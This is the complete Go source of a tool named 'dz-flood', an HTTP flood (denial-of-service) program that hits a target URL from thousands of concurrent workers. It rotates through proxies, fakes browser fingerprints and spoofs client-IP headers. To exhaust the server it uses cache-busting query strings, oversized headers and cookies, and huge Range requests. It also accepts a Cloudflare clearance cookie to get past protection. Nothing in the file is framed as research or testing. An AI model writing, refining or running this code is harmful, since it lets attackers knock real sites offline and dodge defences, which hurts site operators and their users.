package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
)

const (
	wrk   = 1500
	to    = 5 * time.Second
	sub   = 5
	Alive = 30 * time.Second
)

type Spof struct {
	UA          string
	Accept      string
	Lang        string
	Encoding    string
	SecChUa     string
	SecChUaMov  string
	SecChUaPlat string
	Refs        []string
}

var (
	Chrome  = []string{"https://www.google.com/search?q=", "https://www.bing.com/search?q="}
	Firefox = []string{"https://www.google.com/search?q=", "https://www.duckduckgo.com/?q=", "https://www.bing.com/search?q="}
	Edge    = []string{"https://www.bing.com/search?q=", "https://www.google.com/search?q="}
	Safari  = []string{"https://www.google.com/search?q="}
)

var profiles = []Spof{
	{
		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     `"Chromium";v="144", "Google Chrome";v="144", "Not?A_Brand";v="99"`,
		SecChUaMov:  "?0",
		SecChUaPlat: "Windows",
		Refs:        Chrome,
	},
	{
		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     "",
		SecChUaMov:  "",
		SecChUaPlat: "",
		Refs:        Firefox,
	},
	{
		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     `"Chromium";v="145", "Microsoft Edge";v="145", "Not?A_Brand";v="99"`,
		SecChUaMov:  "?0",
		SecChUaPlat: "Windows",
		Refs:        Edge,
	},
	{
		UA:          "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
		Lang:        "en-US,en;q=0.9",
		Encoding:    "gzip, deflate, br",
		SecChUa:     "",
		SecChUaMov:  "",
		SecChUaPlat: "",
		Refs:        Safari,
	},
}

var PATH_POOL = []string{
	"/", "/index.html", "/favicon.ico", "/robots.txt", "/sitemap.xml", "/ads.txt", "/app-ads.txt",
	"/api/health", "/api/v1/status", "/api/v2/ping", "/api/v3/check", "/api/v4/heartbeat", "/api/v5/live", "/api/v6/ready",
	"/api/users", "/api/users/login", "/api/users/register", "/api/users/profile", "/api/users/settings", "/api/users/avatar",
	"/api/products", "/api/products/all", "/api/products/category", "/api/products/detail", "/api/products/search", "/api/products/recommend",
	"/api/orders", "/api/orders/create", "/api/orders/status", "/api/orders/history", "/api/orders/cancel", "/api/orders/track",
	"/api/payment", "/api/payment/checkout", "/api/payment/verify", "/api/payment/callback", "/api/payment/webhook",
	"/api/cart", "/api/cart/add", "/api/cart/remove", "/api/cart/update", "/api/cart/clear", "/api/cart/checkout",
	"/api/reviews", "/api/reviews/add", "/api/reviews/delete", "/api/reviews/update", "/api/reviews/list",
	"/api/notifications", "/api/notifications/unread", "/api/notifications/mark-read", "/api/notifications/clear",
	"/api/messages", "/api/messages/send", "/api/messages/inbox", "/api/messages/outbox", "/api/messages/delete",
	"/api/friends", "/api/friends/add", "/api/friends/remove", "/api/friends/list", "/api/friends/requests",
	"/api/groups", "/api/groups/create", "/api/groups/join", "/api/groups/leave", "/api/groups/members", "/api/groups/delete",
	"/api/analytics", "/api/analytics/track", "/api/analytics/report", "/api/analytics/dashboard", "/api/analytics/export",
	"/api/settings", "/api/settings/update", "/api/settings/theme", "/api/settings/notifications", "/api/settings/privacy",
	"/api/uploads", "/api/uploads/image", "/api/uploads/file", "/api/uploads/avatar", "/api/uploads/delete",
	"/api/download", "/api/download/file", "/api/download/resume", "/api/download/cancel",
	"/api/search", "/api/search/all", "/api/search/users", "/api/search/products", "/api/search/history",
	"/wp-admin/", "/wp-admin/index.php", "/wp-admin/admin.php", "/wp-admin/post.php", "/wp-admin/edit.php",
	"/wp-admin/plugins.php", "/wp-admin/themes.php", "/wp-admin/users.php", "/wp-admin/tools.php", "/wp-admin/options-general.php",
	"/wp-admin/upload.php", "/wp-admin/media-upload.php", "/wp-admin/link-manager.php", "/wp-admin/edit-comments.php",
	"/wp-login.php", "/wp-register.php", "/wp-signup.php", "/wp-activate.php", "/wp-comments-post.php",
	"/admin", "/admin/login", "/admin/dashboard", "/admin/users", "/admin/settings", "/admin/logout",
	"/admin/panel", "/admin/control", "/admin/management", "/admin/analytics", "/admin/reports",
	"/user", "/user/profile", "/user/settings", "/user/dashboard", "/user/activity", "/user/friends",
	"/register", "/login", "/logout", "/forgot-password", "/reset-password", "/change-password",
	"/verify-email", "/confirm-email", "/unsubscribe", "/terms", "/privacy", "/cookie-policy",
	"/product", "/products", "/product/new", "/product/popular", "/product/trending", "/product/discount",
	"/category", "/categories", "/category/electronics", "/category/fashion", "/category/food", "/category/books",
	"/category/sports", "/category/music", "/category/games", "/category/movies", "/category/travel",
	"/shop", "/shop/all", "/shop/new", "/shop/sale", "/shop/clearance", "/shop/favorites",
	"/cart", "/checkout", "/payment", "/success", "/cancel", "/order-tracking",
	"/blog", "/blog/posts", "/blog/categories", "/blog/authors", "/blog/tags", "/blog/archive",
	"/blog/new", "/blog/popular", "/blog/trending", "/blog/recent", "/blog/featured",
	"/article", "/articles", "/article/new", "/article/popular", "/article/trending",
	"/news", "/news/latest", "/news/popular", "/news/category", "/news/breaking",
	"/event", "/events", "/event/upcoming", "/event/past", "/event/register",
	"/contact", "/about", "/about-us", "/about/team", "/about/careers", "/about/history",
	"/team", "/teams", "/team/members", "/team/join", "/team/contact",
	"/career", "/careers", "/career/jobs", "/career/apply", "/career/internship",
	"/faq", "/help", "/support", "/support/tickets", "/support/chat", "/support/email",
	"/download", "/downloads", "/download/latest", "/download/stable", "/download/beta",
	"/community", "/forum", "/discuss", "/discussion", "/thread", "/topic",
	"/media", "/gallery", "/photos", "/videos", "/audio", "/podcast",
	"/services", "/pricing", "/plans", "/subscription", "/premium", "/upgrade",
	"/test", "/demo", "/sample", "/example", "/sandbox", "/staging",
	"/docs", "/documentation", "/api-docs", "/guide", "/tutorial", "/examples",
	"/dashboard", "/dashboard/overview", "/dashboard/stats", "/dashboard/activity", "/dashboard/reports",
	"/app", "/app/home", "/app/settings", "/app/profile", "/app/notifications", "/app/messages",
}

var CBP = []string{"_", "cb", "rnd", "ts", "cache", "v", "ver", "t", "q", "s", "page", "id", "rand", "random", "nonce", "token", "hash", "sig", "key", "secret"}

var COOKIES = []string{"session", "__cfduid", "_ga", "_gid", "visitor", "token", "cf_clearance", "__cf_bm", "_gat", "_fbp", "_gcl_au", "_hjid", "_hjIncludedInSample"}

type CLI struct {
	client *http.Client
	ip     string
}

func init() {
	runtime.GOMAXPROCS(runtime.NumCPU())
	rand.Seed(time.Now().UnixNano())
}

func RST(rng *rand.Rand, length int) string {
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = chars[rng.Intn(len(chars))]
	}
	return string(b)
}

func RIP() string {
	return fmt.Sprintf("%d.%d.%d.%d", rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256))
}

func getRandomPath() string {
	return PATH_POOL[rand.Intn(len(PATH_POOL))]
}

var customCookie string

func main() {
	log.SetOutput(io.Discard)

	if len(os.Args) < 2 {
		fmt.Println("Cara pakai: dz-flood <target> [duration] [cookie]")
		fmt.Println("Contoh: dz-flood https://target.com 60 \"cf_clearance=xxx\"")
		os.Exit(1)
	}
	tgt := os.Args[1]
	dur := 0
	if len(os.Args) >= 3 {
		if d, err := strconv.Atoi(os.Args[2]); err == nil && d > 0 {
			dur = d
		}
	}
	if len(os.Args) >= 4 {
		customCookie = os.Args[3]
	}

	parsedTarget, _ := url.Parse(tgt)
	targetHost := parsedTarget.Host

	var proxies []*url.URL
	file, err := os.Open("proxy.txt")
	if err == nil {
		defer file.Close()
		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			line := strings.TrimSpace(scanner.Text())
			if line == "" {
				continue
			}
			if !strings.HasPrefix(line, "http://") && !strings.HasPrefix(line, "https://") {
				line = "http://" + line
			}
			if p, err := url.Parse(line); err == nil {
				proxies = append(proxies, p)
			}
		}
	}
	if len(proxies) == 0 {
		proxies = append(proxies, nil)
	}

	wcs := make([]CLI, len(proxies))
	for i, proxyURL := range proxies {
		tr := &http.Transport{
			DialContext: (&net.Dialer{
				Timeout:   5 * time.Second,
				KeepAlive: Alive,
			}).DialContext,
			DisableKeepAlives:      false,
			MaxIdleConns:           50000,
			MaxIdleConnsPerHost:    50000,
			MaxConnsPerHost:        0,
			IdleConnTimeout:        Alive,
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
				MinVersion:         tls.VersionTLS12,
				MaxVersion:         tls.VersionTLS13,
				NextProtos:         []string{"h2", "http/1.1"},
				CipherSuites: []uint16{
					tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
					tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
					tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
					tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
					tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
					tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
				},
			},
			ForceAttemptHTTP2:     true,
			DisableCompression:    false,
			TLSHandshakeTimeout:   5 * time.Second,
			ResponseHeaderTimeout: 3 * time.Second,
			ExpectContinueTimeout: 1 * time.Second,
		}
		ip := ""
		if proxyURL != nil {
			tr.Proxy = http.ProxyURL(proxyURL)
			ip = proxyURL.Hostname()
		}
		jar, _ := cookiejar.New(nil)
		client := &http.Client{
			Transport: tr,
			Timeout:   to,
			Jar:       jar,
		}
		wcs[i] = CLI{client: client, ip: ip}
	}

	fmt.Printf("\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
	fmt.Printf("ޗ | Author | Diz Flyze\n")
	fmt.Printf("ޗ | Target | %s\n", tgt)
	fmt.Printf("ޗ | Time   | %d/s\n", dur)
	fmt.Printf("ޗ | Proxy  | %d\n", len(proxies))
	fmt.Printf("ޗ | Conc   | %d\n", wrk)
	fmt.Printf("ޗ | Method | RDT-FLOOD\n")
	fmt.Printf("ޗ | Ulimit | 1048576\n")
	if customCookie != "" {
		fmt.Printf("ޗ | Cookie | %s\n", customCookie[:30])
	} else {
		fmt.Printf("ޗ | Cookie | False\n")
	}
	fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n\n")

	ctx, cancel := context.WithCancel(context.Background())
	var wg sync.WaitGroup

	if dur > 0 {
		time.AfterFunc(time.Duration(dur)*time.Second, func() {
			cancel()
		})
	}

	for i := 0; i < wrk; i++ {
		wg.Add(1)
		c := wcs[i%len(wcs)]
		go func(cli CLI, workerID int) {
			defer wg.Done()
			rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(workerID)))

			var swg sync.WaitGroup
			for s := 0; s < sub; s++ {
				swg.Add(1)
				go func(subID int) {
					defer swg.Done()
					subRng := rand.New(rand.NewSource(rng.Int63()))

					for ctx.Err() == nil {
						prof := profiles[subRng.Intn(len(profiles))]

						baseURL := strings.TrimRight(tgt, "/")
						path := getRandomPath()
						if subRng.Intn(3) == 0 {
							path += "/" + RST(subRng, 4+subRng.Intn(8))
						}
						if subRng.Intn(3) == 0 {
							path += "/" + RST(subRng, 4+subRng.Intn(8))
						}
						reqURL := baseURL + path

						if strings.Contains(reqURL, "?") {
							reqURL += "&"
						} else {
							reqURL += "?"
						}

						param := CBP[subRng.Intn(len(CBP))]
						reqURL += param + "=" + strconv.FormatInt(subRng.Int63(), 10)
						reqURL += "&_=" + strconv.FormatInt(time.Now().UnixNano(), 10)
						reqURL += "&cb=" + strconv.FormatInt(subRng.Int63(), 16)
						if subRng.Intn(2) == 0 {
							reqURL += "&big=" + strings.Repeat("x", 1024+subRng.Intn(1024))
						}
						if subRng.Intn(3) == 0 {
							reqURL += "&" + RST(subRng, 8) + "=" + RST(subRng, 12)
						}
						if subRng.Intn(2) == 0 {
							reqURL += "&" + RST(subRng, 10) + "=" + strings.Repeat("y", 512+subRng.Intn(512))
						}
						if subRng.Intn(2) == 0 {
							reqURL += "&nonce=" + strconv.FormatInt(subRng.Int63(), 36)
						}

						req, _ := http.NewRequest("GET", reqURL, nil)

						req.Header.Set("User-Agent", prof.UA)
						req.Header.Set("Accept", prof.Accept)
						req.Header.Set("Accept-Language", prof.Lang)
						req.Header.Set("Accept-Encoding", prof.Encoding)
						req.Header.Set("Connection", "keep-alive")
						req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
						req.Header.Set("Pragma", "no-cache")
						req.Header.Set("Expires", "0")

						req.Header.Set("Upgrade-Insecure-Requests", "1")
						req.Header.Set("X-Cache-Buster", fmt.Sprintf("%x", subRng.Int63()))
						if subRng.Intn(2) == 0 {
							req.Header.Set("If-Modified-Since", time.Now().AddDate(1, 0, 0).Format(time.RFC1123))
						}
						if subRng.Intn(3) == 0 {
							req.Header.Set("X-Original-URL", "/"+RST(subRng, 20))
						}
						if subRng.Intn(3) == 0 {
							req.Header.Set("X-Forwarded-Host", targetHost)
						}
						if subRng.Intn(2) == 0 {
							req.Header.Set("X-Request-ID", strconv.FormatInt(subRng.Int63(), 16))
						}
						if subRng.Intn(3) == 0 {
							req.Header.Set("X-Real-IP", RIP())
						}
						if subRng.Intn(5) == 0 {
							req.Header.Set("CF-Connecting-IP", RIP())
						}
						if subRng.Intn(5) == 0 {
							req.Header.Set("CDN-Loop", "cloudflare")
						}
						if subRng.Intn(3) == 0 {
							req.Header.Set("True-Client-IP", RIP())
						}
						if subRng.Intn(5) == 0 {
							req.Header.Set("X-Forwarded-Proto", "https")
						}
						if subRng.Intn(5) == 0 {
							req.Header.Set("X-Forwarded-Port", "443")
						}

						ref := prof.Refs[subRng.Intn(len(prof.Refs))]
						ref += RST(subRng, 20) + "=" + strings.Repeat("x", 512+subRng.Intn(1024))
						req.Header.Set("Referer", ref)

						if cli.ip != "" {
							req.Header.Set("X-Forwarded-For", cli.ip)
						} else {
							req.Header.Set("X-Forwarded-For", RIP())
						}

						start := subRng.Intn(10000)
						end := start + 10000000 + subRng.Intn(50000000)
						req.Header.Set("Range", fmt.Sprintf("bytes=%d-%d", start, end))
						if subRng.Intn(2) == 0 {
							req.Header.Set("If-Range", `"`+RST(subRng, 20)+`"`)
						} else {
							past := time.Now().Add(-time.Duration(subRng.Intn(86400)) * time.Second).Format(time.RFC1123)
							req.Header.Set("If-Range", past)
						}

						cookieParts := []string{"big=" + strings.Repeat("x", 2048+subRng.Intn(2048))}
						if customCookie != "" {
							cookieParts = append(cookieParts, customCookie)
						}
						for _, name := range COOKIES {
							if subRng.Intn(2) == 0 {
								cookieParts = append(cookieParts, name+"="+strconv.FormatInt(subRng.Int63(), 16))
							}
						}
						if len(cookieParts) > 0 {
							req.Header.Set("Cookie", strings.Join(cookieParts, "; "))
						}

						if prof.SecChUa != "" {
							req.Header.Set("Sec-Ch-Ua", prof.SecChUa)
							req.Header.Set("Sec-Ch-Ua-Mobile", prof.SecChUaMov)
							req.Header.Set("Sec-Ch-Ua-Platform", prof.SecChUaPlat)
						}
						req.Header.Set("Sec-Fetch-Site", "none")
						req.Header.Set("Sec-Fetch-Mode", "navigate")
						req.Header.Set("Sec-Fetch-Dest", "document")

						if subRng.Intn(2) == 0 {
							req.Header.Set("X-Large-Data", strings.Repeat("x", 4096+subRng.Intn(4096)))
						}
						if subRng.Intn(3) == 0 {
							req.Header.Set("X-Bulk-Data", strings.Repeat("x", 8192+subRng.Intn(8192)))
						}

						resp, err := cli.client.Do(req)
						if err == nil {
							io.Copy(io.Discard, resp.Body)
							resp.Body.Close()
						}
					}
				}(s)
			}
			swg.Wait()
		}(c, i)
	}

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	select {
	case <-sig:
		cancel()
	case <-ctx.Done():
	}
	wg.Wait()
}
